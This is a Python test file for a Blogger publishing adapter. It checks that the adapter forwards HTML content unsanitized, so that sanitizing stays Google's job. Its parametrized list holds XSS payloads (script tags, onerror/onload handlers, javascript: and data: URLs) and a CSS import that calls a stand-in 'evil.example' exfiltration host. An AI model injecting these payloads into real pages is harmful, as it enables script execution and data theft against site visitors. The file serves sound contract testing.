"""Forwarder-role XSS contract test for BloggerAPIAdapter.

Plan 2026-05-18-006 Unit 5 + Threat Model Tampering row. Locks the
architectural invariant:

  **The adapter is a forwarder, not a sanitizer.** Server-side sanitization
  is delegated to the Google Blogger API. If a future PR adds adapter-side
  sanitization, this test fails — and that's the signal to either (a) remove
  the new sanitization or (b) update the threat model to reflect the new
  trust boundary.

The test feeds known XSS payloads through ``BloggerAPIAdapter.publish()``
with the same mocking pattern as ``tests/test_adapter_blogger_api.py`` and
asserts each payload appears VERBATIM in the body sent to Google. We do not
assert what Google does with the payload — that is the platform's contract;
observe-it-quarterly TODO via a sandbox post (manual, not in CI).
"""

from __future__ import annotations

from typing import Any
from unittest.mock import MagicMock, patch

import pytest

from backlink_publisher.config import BloggerOAuthConfig, Config
from backlink_publisher.publishing.adapters.blogger_api import BloggerAPIAdapter


_CONFIG = Config(
    blogger_blog_ids={"https://test.example/": "fake-blog-id"},
    blogger_oauth=BloggerOAuthConfig("cid", "csecret"),
)


def _make_payload(
    content_html: str | None = None,
    content_markdown: str = "",
) -> dict[str, Any]:
    payload: dict[str, Any] = {
        "id": "xss-001",
        "title": "XSS Contract Test",
        "tags": ["test"],
        "content_markdown": content_markdown,
        "main_domain": "https://test.example/",
        "publish_mode": "draft",
    }
    if content_html is not None:
        payload["content_html"] = content_html
    return payload


def _make_mock_service():
    mock_service = MagicMock()
    mock_service.posts.return_value.insert.return_value.execute.return_value = {
        "url": "https://test.blogspot.com/2026/05/post.html",
        "id": "post-001",
    }
    return mock_service


def _capture_post_body(payload: dict[str, Any]) -> dict[str, Any]:
    """Run BloggerAPIAdapter.publish() with mocked HTTP, return the POST body
    that the adapter sent to ``service.posts().insert()``."""
    captured: dict[str, dict[str, Any]] = {}

    def fake_insert(*, blogId, isDraft, body):
        captured["body"] = body
        insert_call = MagicMock()
        insert_call.execute.return_value = {
            "url": "https://test.blogspot.com/2026/05/post.html",
            "id": "post-001",
        }
        return insert_call

    with patch(
        "backlink_publisher.publishing.adapters.blogger_api._build_credentials"
    ), patch(
        "googleapiclient.discovery.build"
    ) as mock_build:
        service = MagicMock()
        service.posts.return_value.insert.side_effect = fake_insert
        mock_build.return_value = service

        adapter = BloggerAPIAdapter()
        adapter.publish(payload, mode="draft", config=_CONFIG)

    return captured["body"]


# Plan 2026-05-18-006 Unit 5: fixed XSS payload list locking the
# forwarder-role contract. Each payload is asserted to appear VERBATIM in
# the body sent to Google Blogger.
_XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    '<iframe src="data:text/html,<script>alert(2)</script>"></iframe>',
    '<img src=x onerror="alert(3)">',
    '<svg onload="alert(4)">',
    "<style>@import url('https://evil.example/exfil.css');</style>",
    '<a href="javascript:alert(5)">click</a>',
    '<a href="data:text/html,<script>alert(6)</script>">click</a>',
]


@pytest.mark.parametrize("xss_payload", _XSS_PAYLOADS)
def test_blogger_forwards_xss_payload_verbatim(xss_payload):
    """Forwarder-role contract: the adapter forwards content_html bytes
    verbatim to Google. The platform's server-side sanitizer is the actual
    defense — observe-it-quarterly via a sandbox post (manual TODO).
    """
    payload = _make_payload(content_html=f"<p>safe</p>{xss_payload}")
    body = _capture_post_body(payload)
    # The XSS payload must appear verbatim in the body content the adapter
    # sends to Google. We don't assert what Google does with it — that's
    # the platform contract (observed manually via quarterly sandbox post).
    assert xss_payload in body["content"], (
        f"BloggerAPIAdapter did NOT forward content_html verbatim. "
        f"Adapter-side sanitization detected — this contradicts the "
        f"forwarder-role contract locked by plan 2026-05-18-006 Unit 5. "
        f"Either remove the sanitization or update the threat model."
    )


def test_blogger_renders_content_markdown_when_html_absent():
    """Legacy path: content_markdown-only rows still render to HTML
    (the existing markdown-it pipeline) bit-exact."""
    payload = _make_payload(content_markdown="**bold** text")
    body = _capture_post_body(payload)
    # markdown-it renders **bold** to <strong> or <b>
    assert "<strong>" in body["content"] or "<b>" in body["content"]
    assert "bold" in body["content"]


def test_blogger_prefers_content_html_when_both_present():
    """Per Unit 5 R9, content_html wins on tier (a) platforms when both
    fields are present."""
    payload = _make_payload(
        content_html="<p>html wins</p>",
        content_markdown="markdown loses",
    )
    body = _capture_post_body(payload)
    assert "html wins" in body["content"]
    assert "markdown loses" not in body["content"]
